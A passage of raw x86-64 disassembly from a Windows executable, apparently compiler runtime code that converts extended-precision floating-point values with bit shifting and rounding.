   14000d5ae:	2b 4d c0             	sub    -0x40(%rbp),%ecx
   14000d5b1:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   14000d5b5:	45 8b d7             	mov    %r15d,%r10d
   14000d5b8:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   14000d5bc:	8b c1                	mov    %ecx,%eax
   14000d5be:	44 89 4d f0          	mov    %r9d,-0x10(%rbp)
   14000d5c2:	99                   	cltd
   14000d5c3:	4d 8b de             	mov    %r14,%r11
   14000d5c6:	44 8b cb             	mov    %ebx,%r9d
   14000d5c9:	41 23 d4             	and    %r12d,%edx
   14000d5cc:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   14000d5d0:	03 c2                	add    %edx,%eax
   14000d5d2:	44 8b e8             	mov    %eax,%r13d
   14000d5d5:	41 23 c4             	and    %r12d,%eax
   14000d5d8:	2b c2                	sub    %edx,%eax
   14000d5da:	41 c1 fd 05          	sar    $0x5,%r13d
   14000d5de:	8b c8                	mov    %eax,%ecx
   14000d5e0:	8b f8                	mov    %eax,%edi
   14000d5e2:	b8 20 00 00 00       	mov    $0x20,%eax
   14000d5e7:	41 d3 e2             	shl    %cl,%r10d
   14000d5ea:	2b c1                	sub    %ecx,%eax
   14000d5ec:	44 8b f0             	mov    %eax,%r14d
   14000d5ef:	41 f7 d2             	not    %r10d
   14000d5f2:	41 8b 00             	mov    (%r8),%eax
   14000d5f5:	8b cf                	mov    %edi,%ecx
   14000d5f7:	8b d0                	mov    %eax,%edx
   14000d5f9:	d3 e8                	shr    %cl,%eax
   14000d5fb:	41 8b ce             	mov    %r14d,%ecx
   14000d5fe:	41 0b c1             	or     %r9d,%eax
   14000d601:	41 23 d2             	and    %r10d,%edx
   14000d604:	44 8b ca             	mov    %edx,%r9d
   14000d607:	41 89 00             	mov    %eax,(%r8)
   14000d60a:	4d 8d 40 04          	lea    0x4(%r8),%r8
   14000d60e:	41 d3 e1             	shl    %cl,%r9d
   14000d611:	4c 2b de             	sub    %rsi,%r11
   14000d614:	75 dc                	jne    0x14000d5f2
   14000d616:	4d 63 d5             	movslq %r13d,%r10
   14000d619:	41 8d 7b 02          	lea    0x2(%r11),%edi
   14000d61d:	45 8d 73 03          	lea    0x3(%r11),%r14d
   14000d621:	4d 8b ca             	mov    %r10,%r9
   14000d624:	44 8b c7             	mov    %edi,%r8d
   14000d627:	49 f7 d9             	neg    %r9
   14000d62a:	4d 3b c2             	cmp    %r10,%r8
   14000d62d:	7c 15                	jl     0x14000d644
   14000d62f:	49 8b d0             	mov    %r8,%rdx
   14000d632:	48 c1 e2 02          	shl    $0x2,%rdx
   14000d636:	4a 8d 04 8a          	lea    (%rdx,%r9,4),%rax
   14000d63a:	8b 4c 05 e8          	mov    -0x18(%rbp,%rax,1),%ecx
   14000d63e:	89 4c 15 e8          	mov    %ecx,-0x18(%rbp,%rdx,1)
   14000d642:	eb 05                	jmp    0x14000d649
   14000d644:	42 89 5c 85 e8       	mov    %ebx,-0x18(%rbp,%r8,4)
   14000d649:	4c 2b c6             	sub    %rsi,%r8
   14000d64c:	79 dc                	jns    0x14000d62a
   14000d64e:	44 8b 45 c8          	mov    -0x38(%rbp),%r8d
   14000d652:	45 8b dc             	mov    %r12d,%r11d
   14000d655:	41 8d 40 01          	lea    0x1(%r8),%eax
   14000d659:	99                   	cltd
   14000d65a:	41 23 d4             	and    %r12d,%edx
   14000d65d:	03 c2                	add    %edx,%eax
   14000d65f:	44 8b c8             	mov    %eax,%r9d
   14000d662:	41 23 c4             	and    %r12d,%eax
   14000d665:	2b c2                	sub    %edx,%eax
   14000d667:	41 c1 f9 05          	sar    $0x5,%r9d
   14000d66b:	44 2b d8             	sub    %eax,%r11d
   14000d66e:	49 63 c1             	movslq %r9d,%rax
   14000d671:	8b 4c 85 e8          	mov    -0x18(%rbp,%rax,4),%ecx
   14000d675:	44 0f a3 d9          	bt     %r11d,%ecx
   14000d679:	0f 83 98 00 00 00    	jae    0x14000d717
   14000d67f:	41 8b cb             	mov    %r11d,%ecx
   14000d682:	41 8b c7             	mov    %r15d,%eax
   14000d685:	49 63 d1             	movslq %r9d,%rdx
   14000d688:	d3 e0                	shl    %cl,%eax
   14000d68a:	f7 d0                	not    %eax
   14000d68c:	85 44 95 e8          	test   %eax,-0x18(%rbp,%rdx,4)
   14000d690:	75 19                	jne    0x14000d6ab
   14000d692:	41 8d 41 01          	lea    0x1(%r9),%eax
   14000d696:	48 63 c8             	movslq %eax,%rcx
   14000d699:	eb 09                	jmp    0x14000d6a4
   14000d69b:	39 5c 8d e8          	cmp    %ebx,-0x18(%rbp,%rcx,4)
   14000d69f:	75 0a                	jne    0x14000d6ab
   14000d6a1:	48 03 ce             	add    %rsi,%rcx
   14000d6a4:	49 3b ce             	cmp    %r14,%rcx
   14000d6a7:	7c f2                	jl     0x14000d69b
   14000d6a9:	eb 6c                	jmp    0x14000d717
   14000d6ab:	41 8b c0             	mov    %r8d,%eax
   14000d6ae:	41 8b cc             	mov    %r12d,%ecx
   14000d6b1:	99                   	cltd
   14000d6b2:	41 23 d4             	and    %r12d,%edx
   14000d6b5:	03 c2                	add    %edx,%eax
   14000d6b7:	44 8b d0             	mov    %eax,%r10d
   14000d6ba:	41 23 c4             	and    %r12d,%eax
   14000d6bd:	2b c2                	sub    %edx,%eax
   14000d6bf:	41 c1 fa 05          	sar    $0x5,%r10d
   14000d6c3:	8b d6                	mov    %esi,%edx
   14000d6c5:	2b c8                	sub    %eax,%ecx
   14000d6c7:	4d 63 ea             	movslq %r10d,%r13
   14000d6ca:	42 8b 44 ad e8       	mov    -0x18(%rbp,%r13,4),%eax
   14000d6cf:	d3 e2                	shl    %cl,%edx
   14000d6d1:	8b cb                	mov    %ebx,%ecx
   14000d6d3:	44 8d 04 10          	lea    (%rax,%rdx,1),%r8d
   14000d6d7:	44 3b c0             	cmp    %eax,%r8d
   14000d6da:	72 05                	jb     0x14000d6e1
   14000d6dc:	44 3b c2             	cmp    %edx,%r8d
   14000d6df:	73 02                	jae    0x14000d6e3
   14000d6e1:	8b ce                	mov    %esi,%ecx
   14000d6e3:	41 8d 42 ff          	lea    -0x1(%r10),%eax
   14000d6e7:	46 89 44 ad e8       	mov    %r8d,-0x18(%rbp,%r13,4)
   14000d6ec:	48 63 d0             	movslq %eax,%rdx
   14000d6ef:	85 c0                	test   %eax,%eax
   14000d6f1:	78 24                	js     0x14000d717
   14000d6f3:	85 c9                	test   %ecx,%ecx
   14000d6f5:	74 20                	je     0x14000d717
   14000d6f7:	8b 44 95 e8          	mov    -0x18(%rbp,%rdx,4),%eax
   14000d6fb:	8b cb                	mov    %ebx,%ecx
   14000d6fd:	44 8d 40 01          	lea    0x1(%rax),%r8d
   14000d701:	44 3b c0             	cmp    %eax,%r8d
   14000d704:	72 05                	jb     0x14000d70b
   14000d706:	44 3b c6             	cmp    %esi,%r8d
   14000d709:	73 02                	jae    0x14000d70d
   14000d70b:	8b ce                	mov    %esi,%ecx
   14000d70d:	44 89 44 95 e8       	mov    %r8d,-0x18(%rbp,%rdx,4)
   14000d712:	48 2b d6             	sub    %rsi,%rdx
   14000d715:	79 dc                	jns    0x14000d6f3
   14000d717:	41 8b cb             	mov    %r11d,%ecx
   14000d71a:	41 8b c7             	mov    %r15d,%eax
   14000d71d:	d3 e0                	shl    %cl,%eax
   14000d71f:	49 63 c9             	movslq %r9d,%rcx
   14000d722:	21 44 8d e8          	and    %eax,-0x18(%rbp,%rcx,4)
   14000d726:	41 8d 41 01          	lea    0x1(%r9),%eax
   14000d72a:	48 63 d0             	movslq %eax,%rdx
   14000d72d:	49 3b d6             	cmp    %r14,%rdx
   14000d730:	7d 19                	jge    0x14000d74b
   14000d732:	48 8d 4d e8          	lea    -0x18(%rbp),%rcx
   14000d736:	4d 8b c6             	mov    %r14,%r8
   14000d739:	4c 2b c2             	sub    %rdx,%r8
   14000d73c:	48 8d 0c 91          	lea    (%rcx,%rdx,4),%rcx
   14000d740:	33 d2                	xor    %edx,%edx
   14000d742:	49 c1 e0 02          	shl    $0x2,%r8
   14000d746:	e8 55 50 ff ff       	call   0x1400027a0
   14000d74b:	8b 05 73 cc 00 00    	mov    0xcc73(%rip),%eax        # 0x14001a3c4
   14000d751:	41 bd 20 00 00 00    	mov    $0x20,%r13d
   14000d757:	44 8b cb             	mov    %ebx,%r9d
   14000d75a:	ff c0                	inc    %eax
   14000d75c:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   14000d760:	99                   	cltd
   14000d761:	41 23 d4             	and    %r12d,%edx
   14000d764:	03 c2                	add    %edx,%eax
   14000d766:	44 8b d0             	mov    %eax,%r10d
   14000d769:	41 23 c4             	and    %r12d,%eax
   14000d76c:	2b c2                	sub    %edx,%eax
   14000d76e:	41 c1 fa 05          	sar    $0x5,%r10d
   14000d772:	8b c8                	mov    %eax,%ecx
   14000d774:	44 8b d8             	mov    %eax,%r11d
   14000d777:	41 d3 e7             	shl    %cl,%r15d
   14000d77a:	44 2b e8             	sub    %eax,%r13d
   14000d77d:	41 f7 d7             	not    %r15d
   14000d780:	41 8b 00             	mov    (%r8),%eax
   14000d783:	41 8b cb             	mov    %r11d,%ecx
   14000d786:	8b d0                	mov    %eax,%edx
   14000d788:	d3 e8                	shr    %cl,%eax
   14000d78a:	41 8b cd             	mov    %r13d,%ecx
   14000d78d:	41 0b c1             	or     %r9d,%eax
   14000d790:	41 23 d7             	and    %r15d,%edx
   14000d793:	44 8b ca             	mov    %edx,%r9d
   14000d796:	41 89 00             	mov    %eax,(%r8)
   14000d799:	4d 8d 40 04          	lea    0x4(%r8),%r8
   14000d79d:	41 d3 e1             	shl    %cl,%r9d
   14000d7a0:	4c 2b f6             	sub    %rsi,%r14
   14000d7a3:	75 db                	jne    0x14000d780
   14000d7a5:	4d 63 d2             	movslq %r10d,%r10
   14000d7a8:	4c 8b c7             	mov    %rdi,%r8
   14000d7ab:	4d 8b ca             	mov    %r10,%r9
   14000d7ae:	49 f7 d9             	neg    %r9
   14000d7b1:	4d 3b c2             	cmp    %r10,%r8
   14000d7b4:	7c 15                	jl     0x14000d7cb
   14000d7b6:	49 8b d0             	mov    %r8,%rdx
   14000d7b9:	48 c1 e2 02          	shl    $0x2,%rdx
   14000d7bd:	4a 8d 04 8a          	lea    (%rdx,%r9,4),%rax
   14000d7c1:	8b 4c 05 e8          	mov    -0x18(%rbp,%rax,1),%ecx
   14000d7c5:	89 4c 15 e8          	mov    %ecx,-0x18(%rbp,%rdx,1)
   14000d7c9:	eb 05                	jmp    0x14000d7d0
   14000d7cb:	42 89 5c 85 e8       	mov    %ebx,-0x18(%rbp,%r8,4)
   14000d7d0:	4c 2b c6             	sub    %rsi,%r8
   14000d7d3:	79 dc                	jns    0x14000d7b1
   14000d7d5:	44 8b c3             	mov    %ebx,%r8d
   14000d7d8:	8b df                	mov    %edi,%ebx
   14000d7da:	e9 1b 01 00 00       	jmp    0x14000d8fa
   14000d7df:	8b 05 df cb 00 00    	mov    0xcbdf(%rip),%eax        # 0x14001a3c4
   14000d7e5:	44 8b 15 cc cb 00 00 	mov    0xcbcc(%rip),%r10d        # 0x14001a3b8
   14000d7ec:	41 bd 20 00 00 00    	mov    $0x20,%r13d
   14000d7f2:	99                   	cltd
   14000d7f3:	41 23 d4             	and    %r12d,%edx
   14000d7f6:	03 c2                	add    %edx,%eax
   14000d7f8:	44 8b d8             	mov    %eax,%r11d
   14000d7fb:	41 23 c4             	and    %r12d,%eax
   14000d7fe:	2b c2                	sub    %edx,%eax
   14000d800:	41 c1 fb 05          	sar    $0x5,%r11d
   14000d804:	8b c8                	mov    %eax,%ecx
   14000d806:	41 d3 e7             	shl    %cl,%r15d
   14000d809:	41 f7 d7             	not    %r15d
   14000d80c:	41 3b fa             	cmp    %r10d,%edi
   14000d80f:	7c 7a                	jl     0x14000d88b
   14000d811:	48 89 5d e8          	mov    %rbx,-0x18(%rbp)
   14000d815:	0f ba 6d e8 1f       	btsl   $0x1f,-0x18(%rbp)
   14000d81a:	89 5d f0             	mov    %ebx,-0x10(%rbp)
   14000d81d:	44 2b e8             	sub    %eax,%r13d
   14000d820:	8b f8                	mov    %eax,%edi
   14000d822:	44 8b cb             	mov    %ebx,%r9d
   14000d825:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   14000d829:	41 8b 00             	mov    (%r8),%eax
   14000d82c:	8b cf                	mov    %edi,%ecx
   14000d82e:	41 8b d7             	mov    %r15d,%edx
   14000d831:	23 d0                	and    %eax,%edx
   14000d833:	d3 e8                	shr    %cl,%eax
   14000d835:	41 8b cd             	mov    %r13d,%ecx
   14000d838:	41 0b c1             	or     %r9d,%eax
   14000d83b:	44 8b ca             	mov    %edx,%r9d
   14000d83e:	41 d3 e1             	shl    %cl,%r9d
   14000d841:	41 89 00             	mov    %eax,(%r8)
   14000d844:	4d 8d 40 04          	lea    0x4(%r8),%r8
   14000d848:	4c 2b f6             	sub    %rsi,%r14
   14000d84b:	75 dc                	jne    0x14000d829
   14000d84d:	4d 63 cb             	movslq %r11d,%r9
   14000d850:	41 8d 7e 02          	lea    0x2(%r14),%edi
   14000d854:	4d 8b c1             	mov    %r9,%r8
   14000d857:	49 f7 d8             	neg    %r8
   14000d85a:	49 3b f9             	cmp    %r9,%rdi
   14000d85d:	7c 15                	jl     0x14000d874
   14000d85f:	48 8b d7             	mov    %rdi,%rdx
   14000d862:	48 c1 e2 02          	shl    $0x2,%rdx
   14000d866:	4a 8d 04 82          	lea    (%rdx,%r8,4),%rax
   14000d86a:	8b 4c 05 e8          	mov    -0x18(%rbp,%rax,1),%ecx
   14000d86e:	89 4c 15 e8          	mov    %ecx,-0x18(%rbp,%rdx,1)
   14000d872:	eb 04                	jmp    0x14000d878
   14000d874:	89 5c bd e8          	mov    %ebx,-0x18(%rbp,%rdi,4)
   14000d878:	48 2b fe             	sub    %rsi,%rdi
   14000d87b:	79 dd                	jns    0x14000d85a
   14000d87d:	44 8b 05 48 cb 00 00 	mov    0xcb48(%rip),%r8d        # 0x14001a3cc
   14000d884:	8b de                	mov    %esi,%ebx
   14000d886:	45 03 c2             	add    %r10d,%r8d
   14000d889:	eb 6f                	jmp    0x14000d8fa
   14000d88b:	44 8b 05 3a cb 00 00 	mov    0xcb3a(%rip),%r8d        # 0x14001a3cc
   14000d892:	0f ba 75 e8 1f       	btrl   $0x1f,-0x18(%rbp)
   14000d897:	44 8b d3             	mov    %ebx,%r10d
   14000d89a:	44 03 c7             	add    %edi,%r8d
   14000d89d:	8b f8                	mov    %eax,%edi
   14000d89f:	44 2b e8             	sub    %eax,%r13d
   14000d8a2:	4c 8d 4d e8          	lea    -0x18(%rbp),%r9
   14000d8a6:	41 8b 01             	mov    (%r9),%eax
   14000d8a9:	8b cf                	mov    %edi,%ecx
   14000d8ab:	8b d0                	mov    %eax,%edx
   14000d8ad:	d3 e8                	shr    %cl,%eax
   14000d8af:	41 8b cd             	mov    %r13d,%ecx
   14000d8b2:	41 0b c2             	or     %r10d,%eax
   14000d8b5:	41 23 d7             	and    %r15d,%edx
   14000d8b8:	44 8b d2             	mov    %edx,%r10d
   14000d8bb:	41 89 01             	mov    %eax,(%r9)
   14000d8be:	4d 8d 49 04          	lea    0x4(%r9),%r9
   14000d8c2:	41 d3 e2             	shl    %cl,%r10d
   14000d8c5:	4c 2b f6             	sub    %rsi,%r14
   14000d8c8:	75 dc                	jne    0x14000d8a6
   14000d8ca:	4d 63 d3             	movslq %r11d,%r10
   14000d8cd:	41 8d 7e 02          	lea    0x2(%r14),%edi
   14000d8d1:	4d 8b ca             	mov    %r10,%r9
   14000d8d4:	49 f7 d9             	neg    %r9
   14000d8d7:	49 3b fa             	cmp    %r10,%rdi
   14000d8da:	7c 15                	jl     0x14000d8f1
   14000d8dc:	48 8b d7             	mov    %rdi,%rdx
   14000d8df:	48 c1 e2 02          	shl    $0x2,%rdx
   14000d8e3:	4a 8d 04 8a          	lea    (%rdx,%r9,4),%rax
   14000d8e7:	8b 4c 05 e8          	mov    -0x18(%rbp,%rax,1),%ecx
   14000d8eb:	89 4c 15 e8          	mov    %ecx,-0x18(%rbp,%rdx,1)
   14000d8ef:	eb 04                	jmp    0x14000d8f5
   14000d8f1:	89 5c bd e8          	mov    %ebx,-0x18(%rbp,%rdi,4)
   14000d8f5:	48 2b fe             	sub    %rsi,%rdi
   14000d8f8:	79 dd                	jns    0x14000d8d7
   14000d8fa:	48 8b 55 d0          	mov    -0x30(%rbp),%rdx
   14000d8fe:	44 2b 25 bf ca 00 00 	sub    0xcabf(%rip),%r12d        # 0x14001a3c4
   14000d905:	41 8a cc             	mov    %r12b,%cl
   14000d908:	41 d3 e0             	shl    %cl,%r8d
   14000d90b:	f7 5d c4             	negl   -0x3c(%rbp)
   14000d90e:	1b c0                	sbb    %eax,%eax
   14000d910:	25 00 00 00 80       	and    $0x80000000,%eax
   14000d915:	44 0b c0             	or     %eax,%r8d
   14000d918:	8b 05 aa ca 00 00    	mov    0xcaaa(%rip),%eax        # 0x14001a3c8
   14000d91e:	44 0b 45 e8          	or     -0x18(%rbp),%r8d
   14000d922:	83 f8 40             	cmp    $0x40,%eax
   14000d925:	75 0b                	jne    0x14000d932
   14000d927:	8b 45 ec             	mov    -0x14(%rbp),%eax
   14000d92a:	44 89 42 04          	mov    %r8d,0x4(%rdx)
   14000d92e:	89 02                	mov    %eax,(%rdx)
   14000d930:	eb 08                	jmp    0x14000d93a
   14000d932:	83 f8 20             	cmp    $0x20,%eax
   14000d935:	75 03                	jne    0x14000d93a
   14000d937:	44 89 02             	mov    %r8d,(%rdx)
   14000d93a:	8b c3                	mov    %ebx,%eax
   14000d93c:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
   14000d940:	48 33 cc             	xor    %rsp,%rcx
   14000d943:	e8 f8 58 ff ff       	call   0x140003240
   14000d948:	4c 8d 5c 24 60       	lea    0x60(%rsp),%r11
   14000d94d:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   14000d951:	49 8b 73 40          	mov    0x40(%r11),%rsi
   14000d955:	49 8b 7b 48          	mov    0x48(%r11),%rdi
   14000d959:	49 8b e3             	mov    %r11,%rsp
   14000d95c:	41 5f                	pop    %r15
   14000d95e:	41 5e                	pop    %r14
   14000d960:	41 5d                	pop    %r13
   14000d962:	41 5c                	pop    %r12
   14000d964:	5d                   	pop    %rbp
   14000d965:	c3                   	ret
   14000d966:	cc                   	int3
   14000d967:	cc                   	int3
   14000d968:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000d96d:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000d972:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000d977:	55                   	push   %rbp
   14000d978:	41 54                	push   %r12
   14000d97a:	41 55                	push   %r13
   14000d97c:	41 56                	push   %r14
   14000d97e:	41 57                	push   %r15
   14000d980:	48 8b ec             	mov    %rsp,%rbp
   14000d983:	48 83 ec 60          	sub    $0x60,%rsp
   14000d987:	48 8b 05 72 b6 00 00 	mov    0xb672(%rip),%rax        # 0x140019000
   14000d98e:	48 33 c4             	xor    %rsp,%rax
   14000d991:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   14000d995:	0f b7 41 0a          	movzwl 0xa(%rcx),%eax
   14000d999:	44 0f b7 09          	movzwl (%rcx),%r9d
   14000d99d:	33 db                	xor    %ebx,%ebx
   14000d99f:	8b f8                	mov    %eax,%edi
   14000d9a1:	25 00 80 00 00       	and    $0x8000,%eax
   14000d9a6:	41 c1 e1 10          	shl    $0x10,%r9d
   14000d9aa:	89 45 c4             	mov    %eax,-0x3c(%rbp)
   14000d9ad:	8b 41 06             	mov    0x6(%rcx),%eax
   14000d9b0:	81 e7 ff 7f 00 00    	and    $0x7fff,%edi
   14000d9b6:	89 45 e8             	mov    %eax,-0x18(%rbp)
   14000d9b9:	8b 41 02             	mov    0x2(%rcx),%eax
   14000d9bc:	81 ef ff 3f 00 00    	sub    $0x3fff,%edi
   14000d9c2:	41 bc 1f 00 00 00    	mov    $0x1f,%r12d
   14000d9c8:	48 89 55 d0          	mov    %rdx,-0x30(%rbp)
   14000d9cc:	44 89 4d d8          	mov    %r9d,-0x28(%rbp)
   14000d9d0:	89 45 ec             	mov    %eax,-0x14(%rbp)
   14000d9d3:	44 89 4d f0          	mov    %r9d,-0x10(%rbp)
   14000d9d7:	8d 73 01             	lea    0x1(%rbx),%esi
   14000d9da:	45 8d 74 24 e4       	lea    -0x1c(%r12),%r14d
   14000d9df:	81 ff 01 c0 ff ff    	cmp    $0xffffc001,%edi
   14000d9e5:	75 29                	jne    0x14000da10
   14000d9e7:	44 8b c3             	mov    %ebx,%r8d
   14000d9ea:	8b c3                	mov    %ebx,%eax
   14000d9ec:	39 5c 85 e8          	cmp    %ebx,-0x18(%rbp,%rax,4)
   14000d9f0:	75 0d                	jne    0x14000d9ff
   14000d9f2:	48 03 c6             	add    %rsi,%rax
   14000d9f5:	49 3b c6             	cmp    %r14,%rax
   14000d9f8:	7c f2                	jl     0x14000d9ec
   14000d9fa:	e9 b7 04 00 00       	jmp    0x14000deb6
   14000d9ff:	48 89 5d e8          	mov    %rbx,-0x18(%rbp)
   14000da03:	89 5d f0             	mov    %ebx,-0x10(%rbp)
   14000da06:	bb 02 00 00 00       	mov    $0x2,%ebx
   14000da0b:	e9 a6 04 00 00       	jmp    0x14000deb6
   14000da10:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   14000da14:	45 8b c4             	mov    %r12d,%r8d
   14000da17:	41 83 cf ff          	or     $0xffffffff,%r15d
   14000da1b:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   14000da1f:	8b 05 b3 c9 00 00    	mov    0xc9b3(%rip),%eax        # 0x14001a3d8
   14000da25:	89 7d c0             	mov    %edi,-0x40(%rbp)
   14000da28:	ff c8                	dec    %eax
   14000da2a:	44 8b eb             	mov    %ebx,%r13d
   14000da2d:	89 45 c8             	mov    %eax,-0x38(%rbp)
   14000da30:	ff c0                	inc    %eax
   14000da32:	99                   	cltd
   14000da33:	41 23 d4             	and    %r12d,%edx
   14000da36:	03 c2                	add    %edx,%eax
   14000da38:	44 8b d0             	mov    %eax,%r10d
   14000da3b:	41 23 c4             	and    %r12d,%eax
   14000da3e:	41 c1 fa 05          	sar    $0x5,%r10d
   14000da42:	2b c2                	sub    %edx,%eax
   14000da44:	44 2b c0             	sub    %eax,%r8d
   14000da47:	4d 63 da             	movslq %r10d,%r11
   14000da4a:	42 8b 4c 9d e8       	mov    -0x18(%rbp,%r11,4),%ecx
   14000da4f:	44 89 45 dc          	mov    %r8d,-0x24(%rbp)
   14000da53:	44 0f a3 c1          	bt     %r8d,%ecx
   14000da57:	0f 83 9e 00 00 00    	jae    0x14000dafb
   14000da5d:	41 8b c8             	mov    %r8d,%ecx
   14000da60:	41 8b c7             	mov    %r15d,%eax
   14000da63:	49 63 d2             	movslq %r10d,%rdx
   14000da66:	d3 e0                	shl    %cl,%eax
   14000da68:	f7 d0                	not    %eax
   14000da6a:	85 44 95 e8          	test   %eax,-0x18(%rbp,%rdx,4)
   14000da6e:	75 19                	jne    0x14000da89
   14000da70:	41 8d 42 01          	lea    0x1(%r10),%eax
   14000da74:	48 63 c8             	movslq %eax,%rcx
   14000da77:	eb 09                	jmp    0x14000da82
   14000da79:	39 5c 8d e8          	cmp    %ebx,-0x18(%rbp,%rcx,4)
   14000da7d:	75 0a                	jne    0x14000da89
   14000da7f:	48 03 ce             	add    %rsi,%rcx
   14000da82:	49 3b ce             	cmp    %r14,%rcx
   14000da85:	7c f2                	jl     0x14000da79
   14000da87:	eb 72                	jmp    0x14000dafb
   14000da89:	8b 45 c8             	mov    -0x38(%rbp),%eax
   14000da8c:	41 8b cc             	mov    %r12d,%ecx
   14000da8f:	99                   	cltd
   14000da90:	41 23 d4             	and    %r12d,%edx
   14000da93:	03 c2                	add    %edx,%eax
   14000da95:	44 8b c0             	mov    %eax,%r8d
   14000da98:	41 23 c4             	and    %r12d,%eax
   14000da9b:	2b c2                	sub    %edx,%eax
   14000da9d:	41 c1 f8 05          	sar    $0x5,%r8d
   14000daa1:	8b d6                	mov    %esi,%edx
   14000daa3:	2b c8                	sub    %eax,%ecx
   14000daa5:	4d 63 d8             	movslq %r8d,%r11
   14000daa8:	42 8b 44 9d e8       	mov    -0x18(%rbp,%r11,4),%eax
   14000daad:	d3 e2                	shl    %cl,%edx
   14000daaf:	8d 0c 10             	lea    (%rax,%rdx,1),%ecx
   14000dab2:	3b c8                	cmp    %eax,%ecx
   14000dab4:	72 04                	jb     0x14000daba
   14000dab6:	3b ca                	cmp    %edx,%ecx
   14000dab8:	73 03                	jae    0x14000dabd
   14000daba:	44 8b ee             	mov    %esi,%r13d
   14000dabd:	41 8d 40 ff          	lea    -0x1(%r8),%eax
   14000dac1:	42 89 4c 9d e8       	mov    %ecx,-0x18(%rbp,%r11,4)
   14000dac6:	48 63 d0             	movslq %eax,%rdx
   14000dac9:	85 c0                	test   %eax,%eax
   14000dacb:	78 27                	js     0x14000daf4
   14000dacd:	45 85 ed             	test   %r13d,%r13d
   14000dad0:	74 22                	je     0x14000daf4
   14000dad2:	8b 44 95 e8          	mov    -0x18(%rbp,%rdx,4),%eax
   14000dad6:	44 8b eb             	mov    %ebx,%r13d
   14000dad9:	44 8d 40 01          	lea    0x1(%rax),%r8d
   14000dadd:	44 3b c0             	cmp    %eax,%r8d
   14000dae0:	72 05                	jb     0x14000dae7
   14000dae2:	44 3b c6             	cmp    %esi,%r8d
   14000dae5:	73 03                	jae    0x14000daea
   14000dae7:	44 8b ee             	mov    %esi,%r13d
   14000daea:	44 89 44 95 e8       	mov    %r8d,-0x18(%rbp,%rdx,4)
   14000daef:	48 2b d6             	sub    %rsi,%rdx
   14000daf2:	79 d9                	jns    0x14000dacd
   14000daf4:	44 8b 45 dc          	mov    -0x24(%rbp),%r8d
   14000daf8:	4d 63 da             	movslq %r10d,%r11
   14000dafb:	41 8b c8             	mov    %r8d,%ecx
   14000dafe:	41 8b c7             	mov    %r15d,%eax
   14000db01:	d3 e0                	shl    %cl,%eax
   14000db03:	42 21 44 9d e8       	and    %eax,-0x18(%rbp,%r11,4)
   14000db08:	41 8d 42 01          	lea    0x1(%r10),%eax
   14000db0c:	48 63 d0             	movslq %eax,%rdx
   14000db0f:	49 3b d6             	cmp    %r14,%rdx
   14000db12:	7d 1d                	jge    0x14000db31
   14000db14:	48 8d 4d e8          	lea    -0x18(%rbp),%rcx
   14000db18:	4d 8b c6             	mov    %r14,%r8
   14000db1b:	4c 2b c2             	sub    %rdx,%r8
   14000db1e:	48 8d 0c 91          	lea    (%rcx,%rdx,4),%rcx
   14000db22:	33 d2                	xor    %edx,%edx
   14000db24:	49 c1 e0 02          	shl    $0x2,%r8
   14000db28:	e8 73 4c ff ff       	call   0x1400027a0
   14000db2d:	44 8b 4d d8          	mov    -0x28(%rbp),%r9d
   14000db31:	45 85 ed             	test   %r13d,%r13d
   14000db34:	74 02                	je     0x14000db38
   14000db36:	03 fe                	add    %esi,%edi
   14000db38:	8b 0d 96 c8 00 00    	mov    0xc896(%rip),%ecx        # 0x14001a3d4
   14000db3e:	8b c1                	mov    %ecx,%eax
   14000db40:	2b 05 92 c8 00 00    	sub    0xc892(%rip),%eax        # 0x14001a3d8
   14000db46:	3b f8                	cmp    %eax,%edi
   14000db48:	7d 14                	jge    0x14000db5e
   14000db4a:	48 89 5d e8          	mov    %rbx,-0x18(%rbp)
   14000db4e:	89 5d f0             	mov    %ebx,-0x10(%rbp)
   14000db51:	44 8b c3             	mov    %ebx,%r8d
   14000db54:	bb 02 00 00 00       	mov    $0x2,%ebx
   14000db59:	e9 54 03 00 00       	jmp    0x14000deb2
   14000db5e:	3b f9                	cmp    %ecx,%edi
   14000db60:	0f 8f 31 02 00 00    	jg     0x14000dd97
   14000db66:	2b 4d c0             	sub    -0x40(%rbp),%ecx
   14000db69:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   14000db6d:	45 8b d7             	mov    %r15d,%r10d
   14000db70:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   14000db74:	8b c1                	mov    %ecx,%eax
   14000db76:	44 89 4d f0          	mov    %r9d,-0x10(%rbp)
   14000db7a:	99                   	cltd
   14000db7b:	4d 8b de             	mov    %r14,%r11
   14000db7e:	44 8b cb             	mov    %ebx,%r9d
   14000db81:	41 23 d4             	and    %r12d,%edx
   14000db84:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   14000db88:	03 c2                	add    %edx,%eax
   14000db8a:	44 8b e8             	mov    %eax,%r13d
   14000db8d:	41 23 c4             	and    %r12d,%eax
   14000db90:	2b c2                	sub    %edx,%eax
   14000db92:	41 c1 fd 05          	sar    $0x5,%r13d
   14000db96:	8b c8                	mov    %eax,%ecx
   14000db98:	8b f8                	mov    %eax,%edi
   14000db9a:	b8 20 00 00 00       	mov    $0x20,%eax
   14000db9f:	41 d3 e2             	shl    %cl,%r10d
   14000dba2:	2b c1                	sub    %ecx,%eax
   14000dba4:	44 8b f0             	mov    %eax,%r14d
   14000dba7:	41 f7 d2             	not    %r10d
   14000dbaa:	41 8b 00             	mov    (%r8),%eax
   14000dbad:	8b cf                	mov    %edi,%ecx
   14000dbaf:	8b d0                	mov    %eax,%edx
   14000dbb1:	d3 e8                	shr    %cl,%eax
   14000dbb3:	41 8b ce             	mov    %r14d,%ecx
   14000dbb6:	41 0b c1             	or     %r9d,%eax
   14000dbb9:	41 23 d2             	and    %r10d,%edx
   14000dbbc:	44 8b ca             	mov    %edx,%r9d
   14000dbbf:	41 89 00             	mov    %eax,(%r8)
   14000dbc2:	4d 8d 40 04          	lea    0x4(%r8),%r8
